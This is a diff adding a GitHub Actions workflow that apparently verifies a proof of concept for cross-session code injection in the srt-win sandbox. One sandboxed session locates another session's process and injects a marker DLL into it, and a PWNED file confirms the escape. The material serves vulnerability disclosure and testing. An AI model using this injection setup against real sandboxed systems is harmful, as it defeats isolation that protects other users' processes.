@@ -1,0 +1,135 @@
+name: verify-windows-cross-session-injection-poc
+
+on:
+  workflow_dispatch: {}
+
+jobs:
+  poc:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Rust
+        run: rustup toolchain install
+
+      - name: Build srt-win
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $PSNativeCommandUseErrorActionPreference = $true
+          cargo build --release --locked --manifest-path vendor/srt-win-src/Cargo.toml
+
+      - name: Build marker DLL (proves code ran inside the injected process)
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          New-Item -ItemType Directory -Force -Path C:\srt-poc | Out-Null
+          Copy-Item marker.rs C:\srt-poc\marker.rs
+          rustc --crate-type cdylib -O -o C:\srt-poc\marker.dll C:\srt-poc\marker.rs
+          # Make sure BOTH sandboxed sessions (different token, but same
+          # srt-sandbox user) can read it regardless of inherited ACLs.
+          icacls C:\srt-poc /grant Everyone:(OI)(CI)RX | Out-Null
+          Copy-Item inject_payload.ps1 C:\srt-poc\inject_payload.ps1
+          Get-ChildItem C:\srt-poc
+
+      - name: Install srt-win (test-only sublayer, same pattern as the project's own smoke tests)
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $PSNativeCommandUseErrorActionPreference = $true
+          $Exe = 'vendor\srt-win-src\target\release\srt-win.exe'
+          & $Exe install --sublayer-guid 'a1b2c3d4-0001-4000-8000-000000000001' --proxy-port-range 60080-60089
+          if ($LASTEXITCODE -ne 0) { throw "install failed: $LASTEXITCODE" }
+          $status = & $Exe wfp status --sublayer-guid 'a1b2c3d4-0001-4000-8000-000000000001' | ConvertFrom-Json
+          Write-Host "install status: $($status | ConvertTo-Json -Compress)"
+
+      - name: PoC — two concurrent sandbox sessions, cross-session code injection
+        shell: pwsh
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $Exe = (Resolve-Path 'vendor\srt-win-src\target\release\srt-win.exe').Path
+          $env:SANDBOX_RUNTIME_WIN_DEBUG = '1'
+
+          Write-Host '=== Session A (victim): long-running sandboxed process ==='
+          $psiA = New-Object System.Diagnostics.ProcessStartInfo
+          $psiA.FileName = $Exe
+          $psiA.UseShellExecute = $false
+          $psiA.RedirectStandardOutput = $true
+          $psiA.RedirectStandardError = $true
+          foreach ($a in @('exec','--env',"PATH=$env:PATH",'--','powershell','-NoProfile','-Command','Start-Sleep -Seconds 90')) {
+            $null = $psiA.ArgumentList.Add($a)
+          }
+          $procA = [System.Diagnostics.Process]::Start($psiA)
+          Write-Host "Session A broker PID: $($procA.Id)"
+
+          Write-Host 'Waiting for the sandboxed child to actually start...'
+          $targetPid = $null
+          for ($i = 0; $i -lt 30; $i++) {
+            Start-Sleep -Seconds 1
+            $cands = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
+              Where-Object { $_.CommandLine -match 'Start-Sleep -Seconds 90' }
+            foreach ($c in $cands) {
+              try {
+                $owner = Invoke-CimMethod -InputObject $c -MethodName GetOwner
+                if ($owner.User -eq 'srt-sandbox') {
+                  $targetPid = $c.ProcessId
+                  Write-Host "Found Session A's sandboxed child: pid=$targetPid owner=$($owner.Domain)\$($owner.User)"
+                  break
+                }
+              } catch {}
+            }
+            if ($targetPid) { break }
+          }
+          if (-not $targetPid) {
+            Write-Host 'FAILED to find Session A sandboxed child PID within 30s'
+            Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | ForEach-Object {
+              Write-Host "  candidate: pid=$($_.ProcessId) cmd=$($_.CommandLine)"
+            }
+            throw 'Could not locate Session A target PID'
+          }
+
+          Write-Host ''
+          Write-Host '=== Session B (attacker): injects into Session A target PID, from INSIDE its own sandbox ==='
+          Remove-Item -ErrorAction SilentlyContinue C:\PWNED_cross_session_injection.txt
+          $psiB = New-Object System.Diagnostics.ProcessStartInfo
+          $psiB.FileName = $Exe
+          $psiB.UseShellExecute = $false
+          $psiB.RedirectStandardOutput = $true
+          $psiB.RedirectStandardError = $true
+          foreach ($a in @('exec','--env',"PATH=$env:PATH",'--','powershell','-NoProfile','-File','C:\srt-poc\inject_payload.ps1','-TargetPid',"$targetPid",'-DllPath','C:\srt-poc\marker.dll')) {
+            $null = $psiB.ArgumentList.Add($a)
+          }
+          $procB = [System.Diagnostics.Process]::Start($psiB)
+          $outB = $procB.StandardOutput.ReadToEndAsync()
+          $errB = $procB.StandardError.ReadToEndAsync()
+          $finished = $procB.WaitForExit(60000)
+          Write-Host '--- Session B stdout ---'
+          Write-Host $outB.Result
+          Write-Host '--- Session B stderr ---'
+          Write-Host $errB.Result
+          if (-not $finished) { Write-Host 'Session B TIMED OUT'; $procB.Kill($true) }
+
+          Write-Host ''
+          Write-Host '=== Checking for the injection marker (written by code now running INSIDE Session A) ==='
+          Start-Sleep -Seconds 2
+          if (Test-Path C:\PWNED_cross_session_injection.txt) {
+            Write-Host '--- marker file content ---'
+            Get-Content C:\PWNED_cross_session_injection.txt
+            Write-Host 'VERDICT: REPRODUCED - Session B injected and executed code inside Session A sandboxed process'
+          } else {
+            Write-Host 'VERDICT: NOT REPRODUCED - no marker file found'
+          }
+
+          # Cleanup
+          try { Stop-Process -Id $procA.Id -Force -ErrorAction SilentlyContinue } catch {}
+          Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" |
+            Where-Object { $_.CommandLine -match 'Start-Sleep -Seconds 90' } |
+            ForEach-Object { try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {} }
+
+      - name: Uninstall srt-win (cleanup)
+        if: always()
+        shell: pwsh
+        continue-on-error: true
+        run: |
+          $Exe = 'vendor\srt-win-src\target\release\srt-win.exe'
+          & $Exe uninstall --sublayer-guid 'a1b2c3d4-0001-4000-8000-000000000001'
